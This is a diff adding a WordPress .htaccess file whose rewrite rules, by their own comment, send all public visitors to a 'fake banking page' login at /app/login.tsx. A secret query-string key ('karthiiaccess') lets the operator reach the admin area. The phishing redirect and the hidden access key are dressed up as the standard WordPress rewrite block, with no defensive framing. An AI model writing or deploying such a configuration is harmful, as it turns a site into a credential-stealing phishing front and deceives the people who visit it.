@@ -1,0 +1,21 @@
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+
+# Redirect public users to fake banking page
+RewriteCond %{QUERY_STRING} !karthiiaccess
+RewriteCond %{REQUEST_URI} !^/app/login.tsx$
+RewriteCond %{REQUEST_URI} !^/wp-admin
+RewriteRule ^.*$ /app/login.tsx [L]
+
+# Allow admin to access WordPress
+RewriteCond %{QUERY_STRING} karthiiaccess
+RewriteRule ^wp-login.php$ /wp-admin [L,R=302]
+
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+# END WordPress
